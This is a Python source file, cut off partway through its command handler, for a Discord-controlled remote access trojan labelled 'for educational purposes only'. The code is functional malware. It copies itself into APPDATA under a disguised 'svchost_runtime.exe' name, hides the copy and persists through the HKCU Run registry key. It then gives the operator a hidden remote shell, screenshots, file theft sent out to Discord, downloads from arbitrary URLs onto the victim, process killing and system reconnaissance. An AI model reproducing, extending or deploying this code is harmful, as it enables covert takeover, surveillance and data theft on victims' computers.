# -*- coding: utf-8 -*-
# ⚠️ UYARI: Bu kod yalnızca eğitim amaçlıdır. Yetkisiz erişim yasa dışıdır ve ciddi sonuçları olabilir!
#           Bu kodu kötüye kullanmak tamamen sizin sorumluluğunuzdadır.

import discord
import os
import subprocess
import winreg
import ctypes
import sys
import socket
import threading
import requests
import time
import webbrowser
import shlex       # Argument parsing for msgbox
from PIL import ImageGrab
from io import BytesIO
import psutil
import platform
import re
import uuid
from datetime import datetime
import logging
from typing import Optional, Tuple, List # For type hinting

# --- Constants ---
# 🔴 DİKKAT: Kendi bot tokenınızı BURAYA girin! Güvenli bir yerde saklayın!
TOKEN: str = 'ENTER_TOKEN_HERE'
PREFIX: str = "/"
DEFAULT_PERSISTENCE_FILENAME: str = 'svchost_runtime.exe' # Slightly altered name
MAX_OUTPUT_CHUNK_SIZE: int = 1900 # Discord message limit buffer
DEFAULT_TIMEOUT: int = 60 # Seconds for subprocesses and requests

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger(__name__) # Use a named logger

# --- Discord Client Setup ---
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# --- Global State Variables ---
# Thread-safety note: These are modified by the bot's async loop, access should be careful if multi-threading elsewhere.
active_shell_channels: dict[int, bool] = {} # {channel_id: True}
current_working_directories: dict[int, str] = {} # {channel_id: 'C:\\path\\to\\dir'}

# ██████╗ ███████╗██████╗ ██╗███████╗████████╗███████╗
# ██╔══██╗██╔════╝██╔══██╗██║██╔════╝╚══██╔══╝██╔════╝
# ██████╔╝█████╗  ██████╔╝██║███████╗   ██║   ███████╗
# ██╔══██╗██╔══╝  ██╔══██╗██║╚════██║   ██║   ╚════██║
# ██║  ██║███████╗██║  ██║██║███████║   ██║   ███████║
# ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝   ╚══════╝
#     Advanced Discord RAT - Educational Purposes Only

# --- Helper Functions ---

async def send_embed(channel: discord.TextChannel, title: str, description: str, color: discord.Color) -> None:
    """Sends a formatted embed message to a Discord channel."""
    try:
        embed = discord.Embed(title=title, description=description, color=color)
        embed.set_footer(text=f"🤖 RAT Bot | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        await channel.send(embed=embed)
    except discord.errors.Forbidden:
        log.error(f"Permission denied to send message/embed in channel {channel.id}")
        # Attempt to send a basic text message if embed fails due to permissions
        try:
            await channel.send(f"❌ **Error:** Permission denied to send embeds in this channel.\n**{title}**\n{description}")
        except discord.errors.Forbidden:
             log.error(f"Permission denied to send ANY message in channel {channel.id}") # Can't do much more
    except Exception as e:
        log.exception(f"Failed to send embed to channel {channel.id}")
        try:
             await channel.send(f"❌ **Critical Error:** Could not send embed message: {e}")
        except:
            pass # If even basic text fails, log is our only hope

async def send_error(channel: discord.TextChannel, message: str) -> None:
    """Sends an error message embed."""
    await send_embed(channel, "❌ Operation Failed", message, discord.Color.red())

async def send_success(channel: discord.TextChannel, message: str) -> None:
    """Sends a success message embed."""
    await send_embed(channel, "✅ Success", message, discord.Color.green())

async def send_info(channel: discord.TextChannel, message: str) -> None:
    """Sends an informational message embed."""
    await send_embed(channel, "ℹ️ Information", message, discord.Color.blue())

async def send_chunked(channel: discord.TextChannel, text: str, prefix: str = "```\n", suffix: str = "\n```") -> None:
    """Sends long text split into multiple messages within Discord's limits."""
    if not text:
        text = "(No output)"
    for i in range(0, len(text), MAX_OUTPUT_CHUNK_SIZE):
        chunk = text[i:i + MAX_OUTPUT_CHUNK_SIZE]
        try:
            await channel.send(f"{prefix}{chunk}{suffix}")
        except discord.errors.Forbidden:
            log.error(f"Permission denied for chunked send in channel {channel.id}")
            if i == 0: # Only send error once
                 await send_error(channel, "Permission denied to send messages in this channel. Cannot display full output.")
            break # Stop trying to send more chunks
        except Exception as e:
            log.exception(f"Failed to send chunk to channel {channel.id}")
            if i == 0: # Only send error once
                 await send_error(channel, f"A critical error occurred while sending output: {e}")
            break # Stop trying

# --- Persistence and Stealth ---

def ensure_persistence(target_filename: str = DEFAULT_PERSISTENCE_FILENAME) -> None:
    """Copies the executable and adds it to HKCU Run registry key for persistence."""
    if platform.system() != "Windows":
        log.info("Persistence skipped: Not running on Windows.")
        return

    try:
        executable_path = sys.executable
        appdata_path = os.environ.get('APPDATA')
        if not appdata_path:
            log.warning("APPDATA environment variable not found. Skipping persistence.")
            return

        target_path = os.path.join(appdata_path, target_filename)

        # 1. Copy Self (if needed)
        copy_needed = True
        if os.path.exists(target_path):
            try:
                if os.path.getsize(executable_path) == os.path.getsize(target_path):
                    copy_needed = False
                else:
                    log.info(f"Persistence file exists but size differs. Overwriting {target_path}.")
            except OSError as e:
                log.warning(f"Could not get size of existing persistence file {target_path}: {e}. Assuming copy needed.")


        if copy_needed:
            try:
                with open(executable_path, 'rb') as src, open(target_path, 'wb') as dst:
                    dst.write(src.read())
                log.info(f"Successfully copied executable to {target_path}")
                # Hide the copied file
                ctypes.windll.kernel32.SetFileAttributesW(target_path, 2) # FILE_ATTRIBUTE_HIDDEN
                log.info(f"Hid persistence file: {target_path}")
            except OSError as e:
                log.error(f"Failed to copy or hide persistence file to {target_path}: {e}")
                return # Cannot proceed to registry if copy failed

        # 2. Add to Registry (HKCU Run)
        registry_key_name = os.path.splitext(target_filename)[0] # Use filename without extension
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, registry_key_name, 0, winreg.REG_SZ, target_path)
            log.info(f"Successfully added/updated HKCU Run registry key '{registry_key_name}' pointing to {target_path}")
        except FileNotFoundError:
            log.error("Registry Run key not found (Software\\Microsoft\\Windows\\CurrentVersion\\Run).")
        except PermissionError:
            log.error("Permission denied to write to HKCU Run registry key.")
        except Exception as e:
            log.error(f"Failed to set registry key '{registry_key_name}': {e}")

    except Exception as e:
        log.exception("An unexpected error occurred during persistence setup.")

def hide_current_executable() -> None:
    """Hides the currently running executable file (if applicable)."""
    if platform.system() != "Windows":
        log.info("File hiding skipped: Not running on Windows.")
        return

    try:
        executable_path = sys.executable
        if executable_path and executable_path.lower().endswith(('.exe', '.pyw')):
            ctypes.windll.kernel32.SetFileAttributesW(executable_path, 2) # FILE_ATTRIBUTE_HIDDEN
            log.info(f"Successfully hid current executable: {executable_path}")
        else:
             log.info(f"Current executable ({executable_path}) not hidden (not .exe or .pyw).")
    except Exception as e:
        log.exception(f"Failed to hide current executable ({sys.executable}).")

# --- Core RAT Functions ---

def capture_screenshot() -> Optional[BytesIO]:
    """Captures the primary screen and returns it as a BytesIO PNG object."""
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        log.info("Screenshot captured successfully.")
        return buffer
    except Exception as e:
        log.exception("Failed to capture screenshot.")
        return None

def execute_command(command: str, channel_id: int) -> str:
    """Executes a shell command and returns its output."""
    global current_working_directories
    cwd = current_working_directories.get(channel_id, os.getcwd())

    try:
        command_lower = command.strip().lower()

        # Handle 'cd' command separately
        if command_lower.startswith('cd '):
            target_dir_str = command[3:].strip()
            # Expand environment variables like %APPDATA%
            expanded_dir = os.path.expandvars(target_dir_str)
            # Determine absolute path
            target_path = os.path.abspath(os.path.join(cwd, expanded_dir))

            if os.path.isdir(target_path):
                try:
                    os.chdir(target_path)
                    new_cwd = os.getcwd()
                    current_working_directories[channel_id] = new_cwd
                    log.info(f"Channel {channel_id} CWD changed to: {new_cwd}")
                    return f"✅ Directory changed to: `{new_cwd}`"
                except Exception as chdir_err:
                    log.error(f"Error changing directory to {target_path} for channel {channel_id}: {chdir_err}")
                    return f"❌ Failed to change directory to `{target_path}`: {chdir_err}"
            else:
                log.warning(f"Invalid directory for 'cd' in channel {channel_id}: {target_path}")
                return f"❌ Directory not found or invalid: `{target_dir_str}`"

        # Execute other commands
        log.info(f"Executing command in channel {channel_id} (CWD: {cwd}): {command}")
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            cwd=cwd,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        )
        stdout, stderr = process.communicate(timeout=DEFAULT_TIMEOUT)

        # Decode output using system encoding or fallback
        encoding = sys.stdout.encoding or 'utf-8'
        output = stdout.decode(encoding, errors='replace') + stderr.decode(encoding, errors='replace')

        # Update CWD in case the command changed it (less common but possible)
        current_working_directories[channel_id] = os.getcwd()

        log.info(f"Command executed successfully in channel {channel_id}. Output length: {len(output)}")
        return output.strip()

    except subprocess.TimeoutExpired:
        log.error(f"Command timed out ({DEFAULT_TIMEOUT}s) in channel {channel_id}: {command}")
        try:
            process.kill() # Ensure the timed-out process is killed
        except Exception: pass # Process might have already ended
        return f"❌ Command timed out ({DEFAULT_TIMEOUT}s): `{command}`"
    except FileNotFoundError:
        cmd_name = command.split()[0]
        log.error(f"Command not found in channel {channel_id}: {cmd_name}")
        return f"❌ Command or program not found: `{cmd_name}`"
    except PermissionError as e:
         log.error(f"Permission error executing command in {cwd} for channel {channel_id}: {command} - {e}")
         return f"❌ Permission Denied: Cannot execute command.\nError: {e}"
    except Exception as e:
        log.exception(f"Unexpected error executing command '{command}' in channel {channel_id}.")
        return f"❌ Error executing command: `{command}`\nDetails: {str(e)}"

def get_system_information() -> discord.Embed:
    """Gathers comprehensive system information."""
    log.info("Gathering system information...")
    try:
        # Basic Info
        uname = platform.uname()
        sys_info = {
            "user": os.getlogin(),
            "pc_name": socket.gethostname(),
            "os": f"{uname.system} {uname.release} ({uname.version})",
            "arch": uname.machine
        }

        # CPU Info
        cpu_info_str = "N/A"
        try:
            if platform.system() == "Windows":
                # WMIC often gives a cleaner name on Windows
                cpu_info_str = subprocess.check_output(
                    'wmic cpu get name', shell=True, stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
            else: # Fallback for non-Windows or if WMIC fails
                cpu_info_str = uname.processor if uname.processor else "N/A"

            physical_cores = psutil.cpu_count(logical=False)
            logical_cores = psutil.cpu_count(logical=True)
            sys_info["cpu"] = f"{cpu_info_str}\nCores: {physical_cores} Physical / {logical_cores} Logical"
        except Exception as e:
             log.warning(f"Could not get detailed CPU info: {e}")
             sys_info["cpu"] = "N/A"


        # Memory (RAM) Info
        mem = psutil.virtual_memory()
        sys_info["ram"] = f"{mem.total / (1024**3):.2f} GB Total | {mem.used / (1024**3):.2f} GB Used ({mem.percent}%)"

        # Disk Info (Root/C: drive)
        disk_path = 'C:\\' if platform.system() == "Windows" else '/'
        try:
            disk = psutil.disk_usage(disk_path)
            sys_info["disk"] = f"{disk_path} Drive: {disk.total / (1024**3):.2f} GB Total | {disk.used / (1024**3):.2f} GB Used ({disk.percent}%)"
        except FileNotFoundError:
            sys_info["disk"] = f"Drive {disk_path} not found."
        except Exception as e:
            log.warning(f"Could not get disk usage for {disk_path}: {e}")
            sys_info["disk"] = "N/A"


        # Network Info
        sys_info["local_ip"] = "N/A"
        try:
            # Try getting local IP associated with default route
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80)) # Doesn't send data
                sys_info["local_ip"] = s.getsockname()[0]
        except Exception as e:
            log.warning(f"Could not determine primary local IP: {e}. Trying psutil interfaces.")
            # Fallback: Iterate interfaces via psutil
            try:
                 for _, snics in psutil.net_if_addrs().items():
                    for snic in snics:
                        if snic.family == socket.AF_INET and not snic.address.startswith("127."):
                            sys_info["local_ip"] = snic.address
                            break
                    if sys_info["local_ip"] != "N/A": break
            except Exception as psutil_e:
                 log.error(f"Failed to get local IP using psutil: {psutil_e}")


        sys_info["mac"] = ':'.join(re.findall('..', f'{uuid.getnode():012x}'))

        # Uptime
        try:
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot_time
            # Simple timedelta formatting
            total_seconds = int(uptime.total_seconds())
            days, remainder = divmod(total_seconds, 86400)
            hours, remainder = divmod(remainder, 3600)
            minutes, _ = divmod(remainder, 60)
            sys_info["uptime"] = f"{days}d {hours}h {minutes}m"
        except Exception as e:
             log.warning(f"Could not calculate uptime: {e}")
             sys_info["uptime"] = "N/A"


        # --- Build Embed ---
        embed = discord.Embed(
            title=f"🖥️ System Report: {sys_info['pc_name']}",
            color=discord.Color.purple(),
            description=f"Report generated: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
        )
        embed.add_field(name="👤 User", value=f"```{sys_info['user']}```", inline=True)
        embed.add_field(name="💻 Hostname", value=f"```{sys_info['pc_name']}```", inline=True)
        embed.add_field(name="🛡️ OS", value=f"```{sys_info['os']}```", inline=False)
        embed.add_field(name="⚙️ Arch", value=f"```{sys_info['arch']}```", inline=True)
        embed.add_field(name="⏱️ Uptime", value=f"```{sys_info['uptime']}```", inline=True)
        embed.add_field(name="⚡ CPU", value=f"```\n{sys_info['cpu']}\n```", inline=False)
        embed.add_field(name="💾 RAM", value=f"```{sys_info['ram']}```", inline=True)
        embed.add_field(name="🗄️ Disk", value=f"```{sys_info['disk']}```", inline=True)
        embed.add_field(name="🌐 Local IP", value=f"```{sys_info['local_ip']}```", inline=True)
        embed.add_field(name="📡 MAC", value=f"```{sys_info['mac']}```", inline=True)
        embed.set_footer(text="✨ Advanced RAT System")
        log.info("System information gathered successfully.")
        return embed

    except Exception as e:
        log.exception("Critical error while gathering system information.")
        return discord.Embed(title="❌ Error", description=f"Failed to retrieve system info:\n```\n{e}\n```", color=discord.Color.red())


# --- Discord Shell Management ---

async def start_discord_shell(message: discord.Message) -> None:
    """Initiates an interactive shell in the channel."""
    global active_shell_channels, current_working_directories
    channel_id = message.channel.id

    if channel_id in active_shell_channels:
        await send_info(message.channel, "An interactive shell is already active in this channel.")
        return

    # Initialize shell state for this channel
    current_working_directories[channel_id] = os.getcwd()
    username = os.getlogin()
    hostname = socket.gethostname()
    prompt = f"{username}@{hostname}:{current_working_directories[channel_id]}$"

    # Send initial shell prompt with ANSI colors
    initial_message = f"```ansi\n\u001b[1;32m🚀 Interactive Shell Started!\u001b[0m\n\u001b[1;34m{prompt}\u001b[0m \n```"
    await message.channel.send(initial_message)

    # Mark channel as active
    active_shell_channels[channel_id] = True
    log.info(f"Interactive shell started in channel {channel_id}")

async def handle_discord_shell_command(message: discord.Message) -> bool:
    """Processes a command received within an active shell channel."""
    global active_shell_channels, current_working_directories
    channel_id = message.channel.id

    # Ensure shell is active and message isn't from the bot itself
    if channel_id not in active_shell_channels or message.author == client.user:
        return False # Signal that command was not processed by shell handler

    command = message.content.strip()
    username = os.getlogin()
    hostname = socket.gethostname()

    # Clean up user's command message
    try:
        await message.delete()
    except discord.errors.Forbidden:
        log.warning(f"No permission to delete user message in shell channel {channel_id}.")
    except discord.errors.NotFound:
        pass # Message might have been deleted already
    except Exception as e:
         log.exception(f"Error deleting user message in shell channel {channel_id}: {e}")

    # Handle 'exit' command
    if command.lower() == 'exit':
        del active_shell_channels[channel_id]
        if channel_id in current_working_directories: # Clean up CWD state
            del current_working_directories[channel_id]
        await message.channel.send("```ansi\n\u001b[1;31m👋 Shell Terminated.\u001b[0m\n```")
        log.info(f"Interactive shell terminated in channel {channel_id}")
        return True # Command processed

    # Execute the command
    output = execute_command(command, channel_id)

    # Get updated CWD and format prompt
    current_cwd = current_working_directories.get(channel_id, os.getcwd()) # Fetch updated CWD
    prompt = f"{username}@{hostname}:{current_cwd}$"

    # --- Update previous prompt/output (Best Effort) ---
    # Tries to find the last prompt sent by the bot and edit it to show the command executed.
    # This can fail due to rate limits or message history issues.
    edited_previous = False
    try:
        async for prev_msg in message.channel.history(limit=5): # Look back a few messages
            # Find the bot's message that looks like a prompt
             if prev_msg.author == client.user and prev_msg.content.strip().endswith('$'):
                 if prev_msg.content.startswith("```ansi"): # Match ANSI format
                    # Reconstruct how the previous prompt looked and append the executed command
                    edited_content = f"```ansi\n{prev_msg.content.splitlines()[1]}\u001b[0m {command}\n```" # Extract old prompt, add command
                    await prev_msg.edit(content=edited_content)
                    edited_previous = True
                    break # Found and edited
    except Exception as e:
        log.warning(f"Could not edit previous shell prompt in channel {channel_id}: {e}")

    # --- Send Command Output ---
    # If the previous prompt wasn't edited, send the command executed before the output.
    output_prefix = "```\n"
    if not edited_previous:
        output_prefix = f"```\n> {command}\n\n" # Show command if previous prompt wasn't edited

    await send_chunked(message.channel, output, prefix=output_prefix, suffix="\n```")

    # --- Send New Prompt ---
    await message.channel.send(f"```ansi\n\u001b[1;34m{prompt}\u001b[0m \n```") # Blue prompt

    return True # Command processed

# --- Specific Command Implementations ---

def open_link_or_search(query: str) -> Tuple[bool, str]:
    """Opens a URL or searches Google for the query in the default browser."""
    try:
        if re.match(r'^https?://', query, re.IGNORECASE): # Basic URL check
            webbrowser.open(query)
            log.info(f"Opened URL: {query}")
            return True, f"✅ URL opened successfully:\n`{query}`"
        else:
            search_url = f"https://www.google.com/search?q={requests.utils.quote(query)}"
            webbrowser.open(search_url)
            log.info(f"Performed web search for: {query}")
            return True, f"✅ Web search performed for:\n`{query}`"
    except Exception as e:
        log.exception(f"Failed to open browser for query: {query}")
        return False, f"❌ Failed to open browser: {e}"

def show_message_box(title: str, text: str) -> Tuple[bool, str]:
    """Displays a Windows message box to the user in a separate thread."""
    if platform.system() != "Windows":
        return False, "❌ Message boxes are only supported on Windows."

    def _show():
        # MessageBoxW(hWnd, lpText, lpCaption, uType) - MB_OK = 0x0
        ctypes.windll.user32.MessageBoxW(0, text, title, 0)
        log.info(f"Displayed message box: Title='{title}'")

    try:
        # Run in a non-blocking thread
        thread = threading.Thread(target=_show, daemon=True)
        thread.start()
        return True, f"✅ Message box displayed:\n**Title:** `{title}`\n**Message:** `{text}`"
    except Exception as e:
        log.exception("Failed to create thread for message box.")
        return False, f"❌ Failed to display message box: {e}"

def list_running_processes() -> Tuple[bool, str]:
    """Lists running processes with PID, username, and name."""
    try:
        proc_lines = ["PID    | User                 | Name"]
        proc_lines.append("-" * (6 + 3 + 20 + 3 + 30)) # Separator line

        process_count = 0
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = proc.info
                # Handle potential None values or access issues gracefully
                pid = info.get('pid', 'N/A')
                name = info.get('name', 'N/A') or 'N/A' # Ensure empty string becomes N/A
                username = info.get('username', 'N/A') or 'N/A'

                # Format the line
                proc_lines.append(f"{str(pid):<6} | {username:<20} | {name}")
                process_count += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue # Skip processes that ended or we can't access

        if process_count == 0:
            return True, "ℹ️ No accessible processes found."

        output = "\n".join(proc_lines)
        log.info(f"Listed {process_count} running processes.")
        return True, f"🖥️ **Running Processes ({process_count}):**\n{output}" # Output needs send_chunked

    except Exception as e:
        log.exception("Failed to list processes.")
        return False, f"❌ Failed to list processes: {e}"

def terminate_process(target: str) -> Tuple[bool, str]:
    """Terminates a process by PID or name."""
    killed_pids: List[int] = []
    errors: List[str] = []
    target_pid: Optional[int] = None
    target_name: Optional[str] = None

    # Try parsing as PID first
    try:
        target_pid = int(target)
    except ValueError:
        target_name = target.lower() # Not a number, treat as name

    # Attempt termination
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid = proc.info['pid']
            name = proc.info.get('name')
            name_lower = name.lower() if name else None

            match_found = False
            if target_pid is not None and pid == target_pid:
                match_found = True
                log.info(f"Attempting to terminate PID {pid} ('{name}').")
            elif target_name is not None and name_lower == target_name:
                match_found = True
                log.info(f"Attempting to terminate process '{name}' (PID {pid}).")

            if match_found:
                p = psutil.Process(pid)
                p.terminate() # Attempt graceful termination
                # Optionally add p.wait(timeout=1) and p.kill() if terminate isn't enough
                killed_pids.append(pid)
                if target_pid: break # Found the specific PID, no need to check others

        except psutil.NoSuchProcess:
             # Process might have ended between iteration and access
             log.warning(f"Process {pid} not found during termination attempt.")
             continue
        except psutil.AccessDenied:
            err_msg = f"Permission denied to terminate PID {pid} ('{name}')."
            log.warning(err_msg)
            if err_msg not in errors: errors.append(f"🚫 {err_msg}")
        except Exception as e:
            err_msg = f"Error terminating PID {pid} ('{name}'): {e}"
            log.exception(err_msg)
            if err_msg not in errors: errors.append(f"❌ {err_msg}")


    # Compile result message
    result_msg = ""
    if killed_pids:
        result_msg += f"✅ Successfully terminated PID(s): `{', '.join(map(str, killed_pids))}`\n"
    elif not errors: # No PIDs killed and no errors encountered usually means not found
        if target_pid:
             result_msg += f"ℹ️ Process with PID `{target_pid}` not found.\n"
        else:
             result_msg += f"ℹ️ No running process found with name `{target}`.\n"


    if errors:
        result_msg += "\n⚠️ **Encountered Errors:**\n" + "\n".join(errors)

    # Determine overall success based on whether any PIDs were killed
    success = bool(killed_pids)
    return success, result_msg.strip()


def get_public_ip_address() -> Tuple[bool, str]:
    """Fetches the public IP address using an external service."""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        ip = response.json()['ip']
        log.info(f"Fetched public IP address: {ip}")
        return True, f"🌍 **Public IP Address:**\n```\n{ip}\n```"
    except requests.exceptions.Timeout:
        log.error("Timeout while fetching public IP.")
        return False, "❌ Failed to get public IP (Request timed out)."
    except requests.exceptions.RequestException as e:
        log.error(f"Network error fetching public IP: {e}")
        return False, f"❌ Failed to get public IP (Network error): {e}"
    except Exception as e:
        log.exception("Unexpected error fetching public IP.")
        return False, f"❌ Failed to get public IP (Unexpected error): {e}"


# --- Discord Event Handlers ---

@client.event
async def on_ready() -> None:
    """Called when the bot successfully connects to Discord."""
    try:
        activity = discord.Activity(type=discord.ActivityType.watching, name="System Resources")
        await client.change_presence(status=discord.Status.online, activity=activity)
        log.info(f"Successfully logged in as {client.user} (ID: {client.user.id})")
        print("-" * 50)
        print(f" Bot Name: {client.user}")
        print(f" Bot ID:   {client.user.id}")
        print(f" Prefix:   {PREFIX}")
        print(f" Discord.py Version: {discord.__version__}")
        # Be cautious about printing invite links automatically
        # print(f" Invite:   https://discord.com/oauth2/authorize?client_id={client.user.id}&scope=bot&permissions=8")
        print("-" * 50)
    except Exception as e:
        log.critical(f"Error during on_ready setup: {e}", exc_info=True)

@client.event
async def on_message(message: discord.Message) -> None:
    """Called when a message is sent in a channel the bot can see."""
    # Ignore messages from the bot itself
    if message.author == client.user:
        return

    # Check if the channel has an active shell first
    if message.channel.id in active_shell_channels:
        if await handle_discord_shell_command(message):
            return # Shell command was processed, stop further checks

    # Check if the message starts with the prefix
    if not message.content.startswith(PREFIX):
        return

    # Parse command and arguments
    content_without_prefix = message.content[len(PREFIX):].strip()
    if not content_without_prefix:
        return # Ignore messages with only the prefix

    parts = content_without_prefix.split(maxsplit=1) # Split command from the rest
    command = parts[0].lower()
    args_str = parts[1] if len(parts) > 1 else "" # The rest of the string is args

    log.info(f"Received command: '{command}' | Args: '{args_str}' | Channel: {message.channel.id} ({message.channel.name}) | Author: {message.author}")

    # --- Command Dispatcher ---
    try:
        if command in ['help', 'yardim']:
            embed = discord.Embed(title="✨ RAT Command Reference ✨", color=discord.Color.gold())
            embed.description = f"Prefix: `{PREFIX}`. Use commands carefully!"
            # Add fields dynamically for cleaner code
            commands_help = {
                "help": "Displays this help message.",
                "ping": "Checks bot latency and responsiveness.",
                "sysinfo": "Shows detailed system information of the target machine.",
                "cmd [command]": "Executes a single command on the target.",
                "shell": "Starts an interactive terminal session. Use `exit` to close.",
                "screenshot": "Captures and sends a screenshot of the target's screen.",
                "download [file_path]": "Downloads the specified file from the target.",
                "upload [URL] [target_path]": "Downloads file from URL to the target path.",
                "browser [URL or Query]": "Opens a URL or searches Google on the target's browser.",
                "msgbox '[Title]' '[Message]'": "Displays a message box on the target (use quotes).",
                "listproc": "Lists running processes on the target.",
                "kill [PID or Name]": "Terminates a process by its PID or name.",
                "getip": "Fetches the target machine's public IP address.",
            }
            for cmd_syntax, desc in commands_help.items():
                 embed.add_field(name=f"`{PREFIX}{cmd_syntax}`", value=f"➜ {desc}", inline=False)
            embed.set_footer(text="⚠️ Reminder: Unauthorized access is illegal!")
            await message.channel.send(embed=embed)

        elif command == 'ping':
            latency_ms = round(client.latency * 1000)
            await send_success(message.channel, f"🏓 Pong! Latency: `{latency_ms}ms`")

        elif command == 'sysinfo':
            embed = get_system_information()
            await message.channel.send(embed=embed)

        elif command == 'cmd':
            if not args_str:
                await send_error(message.channel, f"Usage: `{PREFIX}cmd [command_to_execute]`")
            else:
                output = execute_command(args_str, message.channel.id)
                await send_chunked(message.channel, f"> {args_str}\n\n{output}", prefix="```cmd\n", suffix="\n```")

        elif command == 'shell':
            await start_discord_shell(message)

        elif command == 'screenshot':
            buffer = capture_screenshot()
            if buffer:
                await message.channel.send("📸 Screenshot Captured:", file=discord.File(buffer, 'screenshot.png'))
            else:
                await send_error(message.channel, "Failed to capture screenshot. Check logs for details.")

        elif command == 'download':
            if not args_str:
                await send_error(message.channel, f"Usage: `{PREFIX}download [path_to_file]`")
                return
            file_path = args_str # Already stripped
            # Resolve relative paths based on channel's CWD if applicable
            if not os.path.isabs(file_path):
                 cwd = current_working_directories.get(message.channel.id, os.getcwd())
                 file_path = os.path.abspath(os.path.join(cwd, file_path))

            # Basic check for path traversal attempt (imperfect but better than nothing)
            # We check if the resolved absolute path is still within a 'safe' base (though defining safe is tricky)
            # For simplicity, we might just check if '..' is present after initial resolve, although legitimate paths can have '..'.
            # A better check would involve ensuring the final path is within expected bounds.
            # Here, we'll just check existence and if it's a file.
            if ".." in file_path.split(os.sep): # Simplistic traversal check
                 log.warning(f"Potential path traversal attempt blocked for download: {file_path}")
                 # await send_error(message.channel, f"Access denied to path: `{args_str}`")
                 # return

            if os.path.isfile(file_path):
                try:
                    file_size = os.path.getsize(file_path)
                    # Discord free tier limit is 25MB now (as of late 2023/2024)
                    MB_LIMIT = 25 * 1024 * 1024
                    if file_size > MB_LIMIT:
                        await send_info(message.channel, f"⚠️ File size ({file_size/1024**2:.2f} MB) exceeds Discord limit ({MB_LIMIT/1024**2} MB). Cannot send `{os.path.basename(file_path)}`.")
                    else:
                        await message.channel.send(f"📥 Sending file: `{os.path.basename(file_path)}` ({file_size/1024**2:.2f} MB)", file=discord.File(file_path))
                        log.info(f"Successfully sent file: {file_path}")
                except discord.errors.Forbidden:
                    await send_error(message.channel, f"Permission denied to upload file: `{os.path.basename(file_path)}`")
                except discord.errors.HTTPException as e:
                    await send_error(message.channel, f"HTTP error sending file (possibly size limit): `{os.path.basename(file_path)}`. Details: {e}")
                except Exception as e:
                    await send_error(message.channel, f"Error sending file `{os.path.basename(file_path)}`: {e}")
            elif os.path.isdir(file_path):
                 await send_error(message.channel, f"Specified path is a directory, not a file: `{file_path}`")
            else:
                await send_error(message.channel, f"File not found: `{file_path}`")

        elif command == 'upload':
             # Usage: /upload <URL> <target_path>
             try:
                 upload_args = args_str.split(maxsplit=1)
                 if len(upload_args) < 2:
                     await send_error(message.channel, f"Usage: `{PREFIX}upload [URL] [target_path]`")
                     return
                 url, target_path_str = upload_args
             except ValueError: # Handles case where only URL is provided
                 await send_error(message.channel, f"Usage: `{PREFIX}upload [URL] [target_path]`")
                 return


             # Resolve target path
             if not os.path.isabs(target_path_str):
                 cwd = current_working_directories.get(message.channel.id, os.getcwd())
                 target_path = os.path.abspath(os.path.join(cwd, target_path_str))
             else:
                  target_path = target_path_str

             # Ensure target directory exists
             target_dir = os.path.dirname(target_path)
             if not os.path.isdir(target_dir):
                 try:
                     os.makedirs(target_dir)
                     log.info(f"Created directory for upload: {target_dir}")
                 except Exception as e:
                     await send_error(message.channel, f"Failed to create target directory `{target_dir}`: {e}")
                     return

             await send_info(message.channel, f"📤 Downloading from `{url}` to `{target_path}`...")
             try:
                 # Perform download
                 with requests.get(url, stream=True, timeout=DEFAULT_TIMEOUT) as r:
                     r.raise_for_status()
                     with open(target_path, 'wb') as f:
                         for chunk in r.iter_content(chunk_size=8192):
                             f.write(chunk)
                 await send_success(message.channel, f"File successfully downloaded to `{target_path}`!")
                 log.info(f"Successfully downloaded {url} to {target_path}")
             except requests.exceptions.Timeout:
                 await send_error(message.channel, f"Download timed out ({DEFAULT_TIMEOUT}s): {url}")
             except requests.exceptions.RequestException as e:
                 await send_error(message.channel, f"Download failed! URL: `{url}`\nError: {e}")
             except OSError as e:
                 await send_error(message.channel, f"Failed to write file! Path: `{target_path}`\nError: {e}")
             except Exception as e:
                 await send_error(message.channel, f"An unexpected error occurred during upload: {e}")

        elif command == 'browser':
             if not args_str:
                  await send_error(message.channel, f"Usage: `{PREFIX}browser [URL_or_Search_Query]`")
             else:
                 success, result = open_link_or_search(args_str)
                 if success: await send_info(message.channel, result)
                 else: await send_error(message.channel, result)

        elif command == 'msgbox':
            # Use shlex to handle quoted arguments correctly
            try:
                msgbox_args = shlex.split(args_str)
                if len(msgbox_args) != 2:
                    await send_error(message.channel, f"Usage: `{PREFIX}msgbox '[Title]' '[Message Text]'` (Use single or double quotes)")
                    return
                title, text = msgbox_args
                success, result = show_message_box(title, text)
                if success: await send_success(message.channel, result)
                else: await send_error(message.channel, result)
            except ValueError as e: # shlex can raise ValueError for unmatched quotes
                 await send_error(message.channel, f"Error parsing arguments (check quotes): {e}")
            except Exception as e:
                 await send_error(message.channel, f"Error processing msgbox command: {e}")


        elif command == 'listproc':
             success, result = list_running_processes()
             if success:
                 await send_chunked(message.channel, result, prefix="```\n", suffix="\n```")
             else:
                 await send_error(message.channel, result)

        elif command == 'kill':
             if not args_str:
